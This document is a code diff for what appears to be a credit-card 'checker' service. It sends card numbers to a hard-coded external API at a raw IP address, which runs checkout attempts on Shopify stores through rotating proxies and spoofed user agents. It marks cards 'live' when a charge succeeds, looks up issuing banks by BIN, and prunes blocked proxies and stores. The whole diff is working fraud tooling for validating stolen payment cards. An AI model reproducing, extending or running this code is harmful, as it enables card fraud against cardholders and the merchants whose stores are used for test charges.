@@ -6233,143 +6233,250 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
           return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
         }
 
-        const SHOPIFY_API_URL_MTXT = "http://108.165.12.183:8081/";
-        const MTXT_DEBUG_CHAT = "-1003848532661";
-        const MTXT_MAX_RETRIES = 5;
-        const mtxtStartTime = Date.now();
+         const SHOPIFY_API_URL_MTXT = "http://108.165.12.183:8081/";
+         const MTXT_MAX_RETRIES = 4; // Match web: UNKNOWN_RETRY_ATTEMPTS = 4
+         const mtxtStartTime = Date.now();
 
-        const mtxtBadResponses = ["Site not supported", "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH", "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED", "Payment method not available", "ARTIFACT_DISSATISFACTION", "VALIDATION_CUSTOM", '"Gateway":"Authorize.net"'];
-        const mtxtProxyDeadIndicators = ["proxy dead", "proxy error", "proxy authentication", "connection refused", "proxy connect", "tunneling socket", "proxy_error", "bad proxy", "cannot connect to host", "socks", "econnrefused", "econnreset"];
-        const mtxtSiteDeadIndicators = ["site dead"];
-        const mtxtUserAgents = [
-          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36',
-          'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36',
-        ];
+         const mtxtBadResponses = ["Site not supported", "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH", "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED", "Payment method not available", "ARTIFACT_DISSATISFACTION", "VALIDATION_CUSTOM", '"Gateway":"Authorize.net"'];
+         const mtxtStrikeResponses = ["MERCHANDISE_EXPECTED_PRICE_MISMATCH"];
+         const mtxtSiteStrikeCounter: Record<string, number> = {};
+         const MTXT_STRIKE_THRESHOLD = 3;
+         const mtxtProxyDeadIndicators = ["proxy dead", "proxy error", "proxy authentication", "connection refused", "proxy connect", "tunneling socket", "proxy_error", "bad proxy", "cannot connect to host", "socks", "econnrefused", "econnreset"];
+         const mtxtSiteDeadIndicators = ["site dead"];
+         const mtxtUserAgents = [
+           'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
+           'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
+           'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
+           'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
+         ];
 
-        const mtxtFormatProxy = (p: any) => p.username && p.password ? `${p.ip}:${p.port}:${p.username}:${p.password}` : `${p.ip}:${p.port}`;
-        const mtxtFailedProxyIds: string[] = [];
-        const mtxtAvailableSites = [...mtxtSites].sort(() => Math.random() - 0.5);
+         const mtxtFormatProxy = (p: any) => p.username && p.password ? `${p.ip}:${p.port}:${p.username}:${p.password}` : `${p.ip}:${p.port}`;
+         const mtxtFailedProxyIds: string[] = [];
+         const mtxtAvailableSites = [...mtxtSites].sort(() => Math.random() - 0.5);
 
-        // BIN lookup helper
-        const mtxtBinCache: Record<string, { bank: string; country: string; flag: string }> = {};
-        const mtxtLookupBin = async (cardNum: string) => {
-          const bin = cardNum.replace(/\D/g, '').slice(0, 6);
-          if (mtxtBinCache[bin]) return mtxtBinCache[bin];
-          let bank = "Unknown", country = "", countryCode = "XX";
-          const getF = (code: string) => { if (!code || code === 'XX') return '🌍'; return String.fromCodePoint(...[...code.toUpperCase()].map(c => 0x1F1E6 + c.charCodeAt(0) - 65)); };
-          try {
-            const r = await fetch(`https://lookup.binlist.net/${bin}`, { headers: { 'Accept-Version': '3' } });
-            if (r.ok) { const d = await r.json(); bank = d.bank?.name || "Unknown"; country = d.country?.name || ""; countryCode = d.country?.alpha2 || "XX"; }
-          } catch {}
-          if (bank === "Unknown") {
-            try {
-              const r2 = await fetch(`https://api.bincodes.com/bin/?format=json&api_key=free&bin=${bin}`);
-              if (r2.ok) { const d2 = await r2.json(); if (d2.bank && d2.bank !== 'N/A') bank = d2.bank; if (d2.countrycode && d2.countrycode !== 'N/A') countryCode = d2.countrycode; }
-            } catch {}
-          }
-          if (bank === "Unknown") {
-            try {
-              const r3 = await fetch(`${SUPABASE_URL}/functions/v1/bin-lookup`, { method: "POST", headers: { "Content-Type": "application/json", "Authorization": `Bearer ${SUPABASE_SERVICE_ROLE_KEY}` }, body: JSON.stringify({ bin }) });
-              if (r3.ok) { const d3 = await r3.json(); if (d3.bank && d3.bank !== 'Unknown') bank = d3.bank; if (d3.countryCode && d3.countryCode !== 'XX') countryCode = d3.countryCode; }
-            } catch {}
-          }
-          const result = { bank, country, flag: getF(countryCode) };
-          mtxtBinCache[bin] = result;
-          return result;
-        };
+         // Helper: check if response is empty/meaningless (should be UNKNOWN, not DEAD) — matches web
+         const mtxtIsEmptyOrErrorOnly = (text: string): boolean => {
+           const trimmed = text.trim().toLowerCase();
+           return !trimmed || trimmed === 'error:' || trimmed === 'error' || trimmed === 'error: ' || trimmed.length < 3;
+         };
 
-        // Single call helper
-        const mtxtCallOnce = async (cardCC: string, siteUrl: string, proxy: string) => {
-          const apiUrl = `${SHOPIFY_API_URL_MTXT}?cc=${encodeURIComponent(cardCC)}&url=${encodeURIComponent(siteUrl)}&proxy=${proxy}`;
-          const controller = new AbortController();
-          const timeout = setTimeout(() => controller.abort(), 45000);
-          try {
-            const resp = await fetch(apiUrl, { method: "GET", headers: { 'Accept': 'application/json, text/plain, */*', 'User-Agent': mtxtUserAgents[Math.floor(Math.random() * mtxtUserAgents.length)], 'Cache-Control': 'no-cache' }, signal: controller.signal });
-            clearTimeout(timeout);
-            const rawText = await resp.text();
-            if (!rawText || rawText.trim() === '') return { status: 'unknown', message: 'Empty', price: 0, priceStr: '$0.00', proxyDead: false, siteDead: false, response: 'Empty' };
-            const rawLower = rawText.toLowerCase();
-            if (rawLower.includes('failed to perform') || rawLower.includes('getaddrinfo') || rawLower.includes('could not resolve proxy') || rawLower.includes('tokenize_fail') || rawLower.includes('no_session_token'))
-              return { status: 'unknown', message: 'Transient', price: 0, priceStr: '$0.00', proxyDead: false, siteDead: false, response: 'Transient' };
-            if (mtxtProxyDeadIndicators.some(ind => rawLower.includes(ind)))
-              return { status: 'dead', message: 'Proxy Dead', price: 0, priceStr: '$0.00', proxyDead: true, siteDead: false, response: 'Proxy Dead' };
-            if (mtxtSiteDeadIndicators.some(ind => rawLower.includes(ind)))
-              return { status: 'dead', message: 'Site Dead', price: 0, priceStr: '$0.00', proxyDead: false, siteDead: true, response: 'Site Dead' };
-            if (mtxtBadResponses.some(bad => rawLower.includes(bad.toLowerCase())))
-              return { status: 'dead', message: 'Bad response', price: 0, priceStr: '$0.00', proxyDead: false, siteDead: false, response: '' };
-            if (rawText.includes('DELIVERY_ADDRESS'))
-              return { status: 'dead', message: 'DELIVERY_ADDRESS', price: 0, priceStr: '$0.00', proxyDead: false, siteDead: false, response: 'DELIVERY_ADDRESS' };
+         // BIN lookup helper
+         const mtxtBinCache: Record<string, { bank: string; country: string; flag: string }> = {};
+         const mtxtLookupBin = async (cardNum: string) => {
+           const bin = cardNum.replace(/\D/g, '').slice(0, 6);
+           if (mtxtBinCache[bin]) return mtxtBinCache[bin];
+           let bank = "Unknown", country = "", countryCode = "XX";
+           const getF = (code: string) => { if (!code || code === 'XX') return '🌍'; return String.fromCodePoint(...[...code.toUpperCase()].map(c => 0x1F1E6 + c.charCodeAt(0) - 65)); };
+           try {
+             const r = await fetch(`https://lookup.binlist.net/${bin}`, { headers: { 'Accept-Version': '3' } });
+             if (r.ok) { const d = await r.json(); bank = d.bank?.name || "Unknown"; country = d.country?.name || ""; countryCode = d.country?.alpha2 || "XX"; }
+           } catch {}
+           if (bank === "Unknown") {
+             try {
+               const r2 = await fetch(`https://api.bincodes.com/bin/?format=json&api_key=free&bin=${bin}`);
+               if (r2.ok) { const d2 = await r2.json(); if (d2.bank && d2.bank !== 'N/A') bank = d2.bank; if (d2.countrycode && d2.countrycode !== 'N/A') countryCode = d2.countrycode; }
+             } catch {}
+           }
+           if (bank === "Unknown") {
+             try {
+               const r3 = await fetch(`${SUPABASE_URL}/functions/v1/bin-lookup`, { method: "POST", headers: { "Content-Type": "application/json", "Authorization": `Bearer ${SUPABASE_SERVICE_ROLE_KEY}` }, body: JSON.stringify({ bin }) });
+               if (r3.ok) { const d3 = await r3.json(); if (d3.bank && d3.bank !== 'Unknown') bank = d3.bank; if (d3.countryCode && d3.countryCode !== 'XX') countryCode = d3.countryCode; }
+             } catch {}
+           }
+           const result = { bank, country, flag: getF(countryCode) };
+           mtxtBinCache[bin] = result;
+           return result;
+         };
 
-            let price = 0, priceStr = '$0.00';
-            const pricePatterns = [/\$[\d,]+\.?\d*/g, /"price":\s*"?[\d.]+/gi, /"amount":\s*"?[\d.]+/gi];
-            for (const pattern of pricePatterns) { const matches = rawText.match(pattern); if (matches) { for (const m of matches) { const v = parseFloat(m.replace(/[^0-9.]/g, "")); if (!isNaN(v) && v > 0 && (v < price || price === 0)) { price = v; priceStr = `$${v.toFixed(2)}`; } } } }
+         // Single API call — exact match of web callApiOnce
+         const mtxtCallOnce = async (cardCC: string, siteUrl: string, proxy: string) => {
+           const apiUrl = `${SHOPIFY_API_URL_MTXT}?cc=${encodeURIComponent(cardCC)}&url=${encodeURIComponent(siteUrl)}&proxy=${proxy}`;
+           const controller = new AbortController();
+           const timeout = setTimeout(() => controller.abort(), 55000); // 55s like web
+           try {
+             const resp = await fetch(apiUrl, { method: "GET", headers: { 'Accept': 'application/json, text/plain, */*', 'User-Agent': mtxtUserAgents[Math.floor(Math.random() * mtxtUserAgents.length)], 'Cache-Control': 'no-cache' }, signal: controller.signal });
+             clearTimeout(timeout);
+             const rawText = await resp.text();
+             if (!rawText || rawText.trim() === '') return { status: 'unknown', message: 'Empty response', price: 0, priceStr: '$0.00', proxyDead: false, siteDead: false, response: '', rawResponse: '' };
+             const rawLower = rawText.toLowerCase();
 
-            let apiStatus = 'unknown', apiMessage = rawText, apiResponse = '';
-            try {
-              const json = JSON.parse(rawText);
-              if (json.Price > 0) { price = json.Price; priceStr = `$${Number(json.Price).toFixed(2)}`; }
-              if (json.Response) apiResponse = String(json.Response).replace(/<[^>]*>/g, '');
-              apiMessage = json.message || json.msg || json.error || rawText;
-              if (json.status === 'CHARGED' || json.status === 'success' || json.full_response === true || json.status === 'ORDER_COMPLETED' || json.Response === 'ORDER_COMPLETED' || json.Response === 'Order completed 💎')
-                { apiStatus = 'live'; apiMessage = json.message || json.Response || 'Charged'; }
-              else if (json.status === 'DECLINED' || json.status === 'failed' || json.full_response === false || json.status === 'DS_REQUIRED' || json.status === '3DS_REQUIRED' || json.status === 'OTP_REQUIRED' || json.Response === 'OTP_REQUIRED')
-                { apiStatus = 'dead'; apiMessage = json.message || json.error || json.Response || 'Declined'; }
-              else {
-                const combined = ((apiMessage || '') + ' ' + (apiResponse || '')).toLowerCase();
-                if (combined.includes('order_completed') || combined.includes('charged') || combined.includes('success') || combined.includes('approved')) apiStatus = 'live';
-                else if (combined.includes('declined') || combined.includes('invalid') || combined.includes('expired') || combined.includes('insufficient') || combined.includes('card_declined') || combined.includes('do_not_honor') || combined.includes('fraud') || combined.includes('otp_required') || combined.includes('3ds') || combined.includes('rejected') || combined.includes('restricted') || combined.includes('generic_decline')) apiStatus = 'dead';
-              }
-            } catch {
-              const lower = rawText.toLowerCase();
-              if (lower.includes('order completed') || lower.includes('charged') || lower.includes('success') || lower.includes('approved')) apiStatus = 'live';
-              else if (lower.includes('declined') || lower.includes('invalid') || lower.includes('expired') || lower.includes('otp_required') || lower.includes('rejected')) apiStatus = 'dead';
-            }
-            return { status: apiStatus, message: apiMessage, price, priceStr, proxyDead: false, siteDead: false, response: apiResponse };
-          } catch (e) { clearTimeout(timeout); const msg = e instanceof Error ? e.message : 'Error'; return { status: 'unknown', message: msg.includes('abort') ? 'Timeout' : msg, price: 0, priceStr: '$0.00', proxyDead: false, siteDead: false, response: '' }; }
-        };
+             // Transient errors → unknown (retryable)
+             if (rawLower.includes('failed to perform') || rawLower.includes('getaddrinfo') || rawLower.includes('could not resolve proxy') || rawLower.includes('tokenize_fail') || rawLower.includes('no_session_token'))
+               return { status: 'unknown', message: 'Transient error', price: 0, priceStr: '$0.00', proxyDead: false, siteDead: false, response: '', rawResponse: rawText };
 
-        // With retry - exponential backoff like web Shopify gateway
-        const mtxtCallWithRetry = async (cardCC: string, siteUrl: string, proxy: string) => {
-          let result = await mtxtCallOnce(cardCC, siteUrl, proxy);
-          if (result.proxyDead || result.siteDead || result.status === 'live' || result.status === 'dead') return result;
-          for (let retry = 1; retry <= MTXT_MAX_RETRIES; retry++) {
-            const baseDelay = 900;
-            const backoffMs = Math.min(12000, baseDelay * (2 ** (retry - 1)) + Math.floor(Math.random() * 500));
-            await new Promise(r => setTimeout(r, backoffMs));
-            result = await mtxtCallOnce(cardCC, siteUrl, proxy);
-            if (result.proxyDead || result.siteDead || result.status === 'live' || result.status === 'dead') return result;
-          }
-          return result;
-        };
+             // Proxy dead
+             if (mtxtProxyDeadIndicators.some(ind => rawLower.includes(ind)))
+               return { status: 'dead', message: 'Proxy Dead', price: 0, priceStr: '$0.00', proxyDead: true, siteDead: false, response: 'Proxy Dead', rawResponse: rawText };
 
-         // Check a single card with site/proxy rotation - try ALL combos before giving up
+             // Site dead
+             if (mtxtSiteDeadIndicators.some(ind => rawLower.includes(ind)))
+               return { status: 'dead', message: 'Site Dead', price: 0, priceStr: '$0.00', proxyDead: false, siteDead: true, response: 'Site Dead', rawResponse: rawText };
+
+             // DELIVERY_ADDRESS → dead
+             if (rawText.includes('DELIVERY_ADDRESS'))
+               return { status: 'dead', message: 'DELIVERY_ADDRESS', price: 0, priceStr: '$0.00', proxyDead: false, siteDead: false, response: 'DELIVERY_ADDRESS', rawResponse: rawText };
+
+             // Strike responses (e.g. MERCHANDISE_EXPECTED_PRICE_MISMATCH) — dead for the card
+             const matchedStrike = mtxtStrikeResponses.find(s => rawLower.includes(s.toLowerCase()));
+             if (matchedStrike)
+               return { status: 'dead', message: `${matchedStrike}`, price: 0, priceStr: '$0.00', proxyDead: false, siteDead: false, response: matchedStrike, rawResponse: rawText };
+
+             // Bad responses → dead
+             if (mtxtBadResponses.some(bad => rawLower.includes(bad.toLowerCase())))
+               return { status: 'dead', message: 'Bad response', price: 0, priceStr: '$0.00', proxyDead: false, siteDead: false, response: '', rawResponse: rawText };
+
+             // Extract price
+             let price = 0, priceStr = '$0.00';
+             const pricePatterns = [/\$[\d,]+\.?\d*/g, /USD\s*[\d,]+\.?\d*/gi, /"price":\s*"?[\d.]+/gi, /"amount":\s*"?[\d.]+/gi, /"total":\s*"?[\d.]+/gi];
+             for (const pattern of pricePatterns) { const matches = rawText.match(pattern); if (matches) { for (const m of matches) { const v = parseFloat(m.replace(/[^0-9.]/g, "")); if (!isNaN(v) && v > 0 && (price === 0 || v < price)) { price = v; priceStr = `$${v.toFixed(2)}`; } } } }
+
+             let apiStatus = 'unknown', apiMessage = rawText, apiResponse = '';
+             try {
+               const json = JSON.parse(rawText);
+               if (json.Price !== undefined && json.Price > 0) { price = json.Price; priceStr = `$${Number(json.Price).toFixed(2)}`; }
+               if (json.Response) apiResponse = String(json.Response).replace(/<[^>]*>/g, '');
+               apiMessage = json.message || json.msg || json.error || rawText;
+
+               // Empty/meaningless response → unknown
+               const responseText = (apiResponse || apiMessage || '').trim();
+               if (mtxtIsEmptyOrErrorOnly(responseText) && price === 0) {
+                 apiStatus = 'unknown';
+               } else if (json.status === 'CHARGED' || json.status === 'success' || json.full_response === true || json.status === 'ORDER_COMPLETED' || json.Response === 'ORDER_COMPLETED' || json.Response === 'Order completed 💎') {
+                 apiStatus = 'live'; apiMessage = json.message || json.Response || 'Charged';
+               } else if (json.status === 'DECLINED' || json.status === 'failed' || json.full_response === false || json.status === 'DS_REQUIRED' || json.status === '3DS_REQUIRED' || json.status === 'OTP_REQUIRED' || json.Response === 'OTP_REQUIRED') {
+                 apiStatus = 'dead'; apiMessage = json.message || json.error || json.Response || 'Declined';
+               } else if (json.status === 'error') {
+                 // Only dead if meaningful error message
+                 const errMsg = (json.message || json.error || '').trim().toLowerCase();
+                 if (errMsg && errMsg !== 'error:' && errMsg !== 'error' && errMsg.length > 5) {
+                   apiStatus = 'dead'; apiMessage = json.message || json.error || 'Declined';
+                 } else {
+                   apiStatus = 'unknown'; apiMessage = 'Request failed';
+                 }
+               } else {
+                 const combined = ((apiMessage || '') + ' ' + (apiResponse || '')).toLowerCase();
+                 if (combined.includes('order_placed') || combined.includes('order placed') || combined.includes('order completed') || combined.includes('order_completed') || combined.includes('thank you') || combined.includes('thankyou') || combined.includes('charged') || combined.includes('success') || combined.includes('approved')) apiStatus = 'live';
+                 else if (combined.includes('declined') || combined.includes('invalid') || combined.includes('expired') || combined.includes('insufficient') || combined.includes('card_declined') || combined.includes('incorrect') || combined.includes('do_not_honor') || combined.includes('fraud') || combined.includes('not accepted') || combined.includes('ds_required') || combined.includes('3ds') || combined.includes('3d_secure') || combined.includes('rejected') || combined.includes('otp_required') || combined.includes('otp required') || combined.includes('pickup_card') || combined.includes('lost_card') || combined.includes('stolen_card') || combined.includes('restricted') || combined.includes('not_permitted') || combined.includes('generic_decline')) apiStatus = 'dead';
+                 else if (combined.includes('failed') || combined.includes('error')) {
+                   const substantive = combined.replace(/error:?\s*/g, '').replace(/failed:?\s*/g, '').trim();
+                   if (substantive.length > 3) apiStatus = 'dead';
+                 }
+               }
+             } catch {
+               const lower = rawText.toLowerCase();
+               if (mtxtIsEmptyOrErrorOnly(lower)) { apiStatus = 'unknown'; }
+               else if (lower.includes('order_placed') || lower.includes('order placed') || lower.includes('order completed') || lower.includes('order_completed') || lower.includes('thank you') || lower.includes('charged') || lower.includes('success') || lower.includes('approved')) apiStatus = 'live';
+               else if (lower.includes('declined') || lower.includes('invalid') || lower.includes('expired') || lower.includes('insufficient') || lower.includes('otp_required') || lower.includes('otp required') || lower.includes('ds_required') || lower.includes('3ds') || lower.includes('rejected')) apiStatus = 'dead';
+               else if (lower.includes('failed') || lower.includes('error')) {
+                 const substantive = lower.replace(/error:?\s*/g, '').replace(/failed:?\s*/g, '').trim();
+                 if (substantive.length > 3) apiStatus = 'dead';
+               }
+             }
+             return { status: apiStatus, message: apiMessage, price, priceStr, proxyDead: false, siteDead: false, response: apiResponse, rawResponse: rawText };
+           } catch (e) { clearTimeout(timeout); const msg = e instanceof Error ? e.message : 'Error'; return { status: 'unknown', message: msg.includes('abort') ? 'Timeout' : msg, price: 0, priceStr: '$0.00', proxyDead: false, siteDead: false, response: '', rawResponse: '' }; }
+         };
+
+         // With retry — linear backoff matching web (1000 * retry + jitter)
+         const mtxtCallWithRetry = async (cardCC: string, siteUrl: string, proxy: string) => {
+           let result = await mtxtCallOnce(cardCC, siteUrl, proxy);
+           if (result.proxyDead || result.siteDead || result.status === 'live' || result.status === 'dead') return result;
+           // Retry every unknown, not just specific patterns — matches web
+           if (result.status === 'unknown') {
+             for (let retry = 1; retry <= MTXT_MAX_RETRIES; retry++) {
+               const delayMs = 1000 * retry + Math.floor(Math.random() * 500);
+               await new Promise(r => setTimeout(r, delayMs));
+               result = await mtxtCallOnce(cardCC, siteUrl, proxy);
+               if (result.proxyDead || result.siteDead || result.status === 'live' || result.status === 'dead') return result;
+             }
+           }
+           return result;
+         };
+
+         // Check a single card — multi-site retry with proxy rotation, matching web exactly
+         const MAX_MTXT_SITE_ATTEMPTS = Math.min(3, mtxtAvailableSites.length);
          const mtxtCheckCard = async (cardCC: string): Promise<{ status: string; response: string; price: string }> => {
-           const shuffledProxies = [...mtxtProxies].filter(p => !mtxtFailedProxyIds.includes(p.id)).sort(() => Math.random() - 0.5);
-           if (shuffledProxies.length === 0) return { status: 'error', response: 'No proxies', price: '$0.00' };
-           const maxSites = Math.min(5, mtxtAvailableSites.length);
-           let lastResponse = 'All attempts failed';
-           for (let si = 0; si < maxSites; si++) {
-             const site = mtxtAvailableSites[si % mtxtAvailableSites.length];
-             for (const proxy of shuffledProxies) {
+           const availableProxies = [...mtxtProxies].filter(p => !mtxtFailedProxyIds.includes(p.id)).sort(() => Math.random() - 0.5);
+           if (availableProxies.length === 0) return { status: 'error', response: 'No proxies available', price: '$0.00' };
+
+           let finalResult: any = null;
+
+           for (let siteAttempt = 0; siteAttempt < MAX_MTXT_SITE_ATTEMPTS; siteAttempt++) {
+             const site = mtxtAvailableSites[siteAttempt % mtxtAvailableSites.length];
+             let siteResult: any = null;
+
+             // Try each proxy for this site
+             const currentProxies = availableProxies.filter(p => !mtxtFailedProxyIds.includes(p.id));
+             if (currentProxies.length === 0) { finalResult = { status: 'error', response: 'All proxies dead', price: '$0.00' }; break; }
+
+             for (const proxy of currentProxies) {
                if (mtxtFailedProxyIds.includes(proxy.id)) continue;
-               const result = await mtxtCallWithRetry(cardCC, site.url, mtxtFormatProxy(proxy));
-               if (result.proxyDead) {
+               siteResult = await mtxtCallWithRetry(cardCC, site.url, mtxtFormatProxy(proxy));
+
+               if (siteResult.proxyDead) {
                  mtxtFailedProxyIds.push(proxy.id);
                  supabase.from('user_proxies').delete().eq('id', proxy.id).then(() => {});
                  continue;
                }
-               if (result.siteDead) {
+
+               if (siteResult.siteDead) {
                  supabase.from('gateway_urls').delete().eq('url', site.url).then(() => {});
-                 break; // skip to next site
+                 siteResult = null;
+                 break;
                }
-               if (result.status === 'live' || result.status === 'dead') {
-                 return { status: result.status, response: result.response || result.message || 'N/A', price: result.price > 0 ? result.priceStr : (site.price ? `$${Number(site.price).toFixed(2)}` : '$0.00') };
+
+               // Legacy proxy error check (407 etc without proxyDead flag) — matches web
+               let isValidApiResponse = false;
+               try { const parsed = JSON.parse(siteResult.rawResponse || ''); if (parsed && (parsed.Gateway || parsed.Response || parsed.Price !== undefined || parsed.status || parsed.message)) isValidApiResponse = true; } catch {}
+               const rl = (siteResult.rawResponse || '').toLowerCase();
+               const isProxyError = !isValidApiResponse && (rl.includes('407') || rl.includes('proxy error') || rl.includes('proxy authentication') || rl.includes('connection refused') || rl.includes('proxy connect') || rl.includes('tunneling socket'));
+               if (isProxyError) {
+                 mtxtFailedProxyIds.push(proxy.id);
+                 supabase.from('user_proxies').delete().eq('id', proxy.id).then(() => {});
+                 continue;
                }
-               // unknown - save response and try next proxy
-               lastResponse = result.response || result.message || 'Unknown';
+
+               // Proxy worked, stop proxy loop
+               break;
              }
+
+             if (!siteResult) {
+               // Site dead or all proxies failed — try next site
+               if (siteAttempt + 1 < MAX_MTXT_SITE_ATTEMPTS) await new Promise(r => setTimeout(r, 300 + Math.random() * 300));
+               continue;
+             }
+
+             // Definitive result → done
+             if (siteResult.status === 'live' || siteResult.status === 'dead') {
+               // Handle strike counter
+               const matchedStrike = mtxtStrikeResponses.find(s => (siteResult.rawResponse || '').toLowerCase().includes(s.toLowerCase()));
+               if (matchedStrike) {
+                 mtxtSiteStrikeCounter[site.url] = (mtxtSiteStrikeCounter[site.url] || 0) + 1;
+                 if (mtxtSiteStrikeCounter[site.url] >= MTXT_STRIKE_THRESHOLD) {
+                   supabase.from('gateway_urls').delete().eq('url', site.url).then(() => {});
+                   delete mtxtSiteStrikeCounter[site.url];
+                 }
+               } else { delete mtxtSiteStrikeCounter[site.url]; }
+
+               return { status: siteResult.status, response: siteResult.response || siteResult.message || 'N/A', price: siteResult.price > 0 ? siteResult.priceStr : (site.price ? `$${Number(site.price).toFixed(2)}` : '$0.00') };
+             }
+
+             // Unknown — keep as fallback and try next site
+             finalResult = siteResult;
+             const rl2 = (siteResult.rawResponse || '').toLowerCase();
+             const isBadSite = mtxtBadResponses.some(bad => rl2.includes(bad.toLowerCase()));
+             if (isBadSite || !siteResult.rawResponse || rl2 === '' || rl2.includes('empty response') || rl2.includes('timeout')) {
+               supabase.from('gateway_urls').delete().eq('url', site.url).then(() => {});
+             }
+
+             if (siteAttempt + 1 < MAX_MTXT_SITE_ATTEMPTS) {
+               await new Promise(r => setTimeout(r, 300 + Math.random() * 300));
+               continue;
+             }
+             break;
            }
-           return { status: 'error', response: lastResponse, price: '$0.00' };
+
+           if (!finalResult) return { status: 'error', response: 'All site attempts failed', price: '$0.00' };
+           return { status: 'error', response: finalResult.response || finalResult.message || 'Unknown', price: '$0.00' };
          };
 
          // Results array
